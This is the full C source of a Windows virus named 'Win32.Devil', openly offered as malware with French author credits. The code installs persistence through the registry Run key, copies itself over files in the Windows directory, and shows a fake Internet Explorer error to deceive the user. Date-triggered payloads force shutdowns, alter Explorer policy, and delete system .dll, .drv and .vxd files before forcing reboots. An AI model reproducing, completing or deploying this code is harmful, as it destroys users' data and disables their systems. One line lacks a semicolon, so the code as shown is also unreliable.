   #define WIN32_LEAN_AND_MEAN
   #include <windows.h>
   #include <dos.h>
   #include <stdlib.h>
   #include <time.h>
   #pragma hdrstop
   #include "devil.h"
   #pragma warning (disable: 4068)
   #pragma warning (disable: 4001)

   BOOL ProcCreate;
   char FilePath[256],ZindDir[256],Del1[256],SysDir[256];
   LPSTR Text1 = "Le diable est dans votre PC!!!!";
   LPSTR Text2 = "Nom du virus: Win32.Devil";
   LPSTR Text3 = "Auteur: ZeMacroKiller98";
   LPSTR Text4 = "Origine: France";
   LPSTR TextE1 = "The devil is inside your PC!!!!";
   LPSTR TextE2 = "Virus name: Win32.Devil";
   LPSTR TextE3 = "Author: ZeMacroKiller98";
   LPSTR TextE4 = "Origin: France";
   HANDLE GetFile;
   HKEY DevKey,RegKey,PayKey;
   HWND FrHwnd,EnHwnd;
   HDC FrHdc,EnHdc;
   int r1,g1,b1,r2,g2,b2,r3,g3,b3,r4,g4,b4;
   #pragma argsused
   int PASCAL WinMain
   (
   HINSTANCE hInstance,
   HINSTANCE hPrevInstance,
   LPSTR     lpszCmdLine,
   int       nCmdShow
   )
   {
   //Win32.Devil par ZeMacroKiller98, membre de [SOS]
   //Search actual file path
   SearchPath(NULL,_argv[0],NULL,sizeof(FilePath),FilePath,NULL);
   //Create Key to run Virii at windows boot
   RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&DevKey);
   RegSetValueEx(DevKey,"DevilVir",0,REG_SZ,FilePath,sizeof(FilePath));
   RegCloseKey(DevKey);
   //Found if file is already infected
   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Devil\\ZeMacroKiller98",0,KEY_ALL_ACCESS,&RegKey)!=ERROR_SUCCESS)
   {
   //Found Files in Windows Directory and infect them
       WIN32_FIND_DATA FindExe;
       GetWindowsDirectory(ZindDir,sizeof(ZindDir));
       SetCurrentDirectory(ZindDir);
       GetFile = FindFirstFile(ZindDir,&FindExe);
       ExeFile:
       CopyFile(_argv[0],FindExe.cFileName,FALSE)
       if((FindNextFile(GetFile,&FindExe))==TRUE)
           goto ExeFile;
       FindClose(GetFile);
       RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Devil\\ZeMacroKiller98",&RegKey);
       if(GetOEMCP()==850)
           MessageBox(NULL,"Une erreur interne au programme s'est produit lors de son lancement\nVeuillez redémarrer votre ordinateur\n","Microsoft Internet Explorer",MB_OK|MB_ICONEXCLAMATION);
       else
           MessageBox(NULL,"Internal error ocurred when you have launch this program\nPlease reboot your computer","Microsoft Internet Explorer",MB_OK|MB_ICONEXCLAMATION);
   }
   RegCloseKey(RegKey);
   //Virus Process
   STARTUPINFO UpFo;
   PROCESS_INFORMATION PrInfo;
   UpFo.cb = sizeof(UpFo);
   UpFo.lpReserved = NULL;
   UpFo.dwFlags = STARTF_FORCEOFFFEEDBACK;
   UpFo.cbReserved2 = 0;
   UpFo.lpReserved2 = NULL;
   ProcCreate = CreateProcess(FilePath,
                       GetCommandLine(),
                       (LPSECURITY_ATTRIBUTES)NULL,
                       (LPSECURITY_ATTRIBUTES)NULL,
                       FALSE,
                       0,
                       NULL,
                       NULL,
                       &UpFo,
                       &PrInfo);
   if(ProcCreate==FALSE)
   {
       ExitProcess(0);
   }
   SYSTEMTIME MyTime;
   GetLocalTime(&MyTime);
   //Payload 1
   if(((MyTime.wMonth==4)&&(MyTime.wDay==16))==TRUE)
   {
   RegOpenKeyEx(HKEY_CURRENT_USER,
               "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
               0,
               KEY_ALL_ACCESS,
               &PayKey);
   RegSetValueEx(PayKey,"NoClose",0,REG_SZ,"1",1);
   RegCloseKey(PayKey);
   }
   //Payload 2
   if(((MyTime.wMonth==5)&&(MyTime.wDay==1))==TRUE)
   {
       MessageBox(NULL,"C'est la fete du travail, aujourd'hui...\nVous n'allez quant meme pas travailler????\nDonc, je vais vous en empecher","Win32.Devil",MB_OK|MB_ICONEXCLAMATION|MB_SYSTEMMODAL);
       ExitWindowsEx(EWX_FORCE|EWX_SHUTDOWN,0);
   }
   //Payload 3
   FrHwnd = FindWindow(NULL,"Propriétés Système");
   EnHwnd = FindWindow(NULL,"System Properties");
   randomize();
   r1 = rand() % 255;
   g1 = rand() % 255;
   b1 = rand() % 255;
   r2 = rand() % 255;
   g2 = rand() % 255;
   b2 = rand() % 255;
   r3 = rand() % 255;
   g3 = rand() % 255;
   b3 = rand() % 255;
   r4 = rand() % 255;
   g4 = rand() % 255;
   b4 = rand() % 255;

   if(FrHwnd!=NULL)
   {
       FrHdc = GetDC(FrHwnd);
       SetBkColor(FrHdc,RGB(192,192,192));
       SetTextColor(FrHdc,RGB(r1,g1,b1));
       TextOut(FrHdc,10,300,Text1,lstrlen(Text1));
       SetTextColor(FrHdc,RGB(r2,g2,b2));
       TextOut(FrHdc,10,315,Text2,lstrlen(Text2));
       SetTextColor(FrHdc,RGB(r3,g3,b3));
       TextOut(FrHdc,10,330,Text3,lstrlen(Text3));
       SetTextColor(FrHdc,RGB(r4,g4,b4));
       TextOut(FrHdc,10,345,Text4,lstrlen(Text4));
       ReleaseDC(FrHwnd,FrHdc);
   }
   if(EnHwnd!=NULL)
   {
       randomize();
       EnHdc = GetDC(EnHwnd);
       SetBkColor(EnHdc,RGB(192,192,192));
       SetTextColor(EnHdc,RGB(r1,g1,b1));
       TextOut(EnHdc,10,300,TextE1,lstrlen(TextE1));
       SetTextColor(EnHdc,RGB(r2,g2,b2));
       TextOut(EnHdc,10,315,TextE2,lstrlen(TextE2));
       SetTextColor(EnHdc,RGB(r3,g3,b3));
       TextOut(EnHdc,10,330,TextE3,lstrlen(TextE3));
       SetTextColor(EnHdc,RGB(r4,g4,b4));
       TextOut(EnHdc,10,345,TextE4,lstrlen(TextE4));
       ReleaseDC(EnHwnd,EnHdc);
   }
   //Payload 4
   if(((MyTime.wMonth==7)&&(MyTime.wDay==13))==TRUE)
   {
       switch(MyTime.wHour){
           case     6:
           {
               GetWindowsDirectory(Del1,sizeof(Del1));
               SetCurrentDirectory(Del1);
               DeleteFile("*.dll");
               ExitWindowsEx(EWX_FORCE|EWX_REBOOT,0);
           }
           break;
           case    12:
           {
               GetSystemDirectory(SysDir,sizeof(SysDir));
               SetCurrentDirectory(SysDir);
               DeleteFile("*.drv");
               ExitWindowsEx(EWX_FORCE|EWX_REBOOT,0);
           }
           break;
           case    18:
           {
               GetSystemDirectory(SysDir,sizeof(SysDir));
               SetCurrentDirectory(SysDir);
               DeleteFile("*.vxd");
               ExitWindowsEx(EWX_FORCE|EWX_REBOOT,0);
            }
            break;
       }
   }
   CloseHandle(PrInfo.hProcess);
   CloseHandle(PrInfo.hThread);
   return 0;
   }
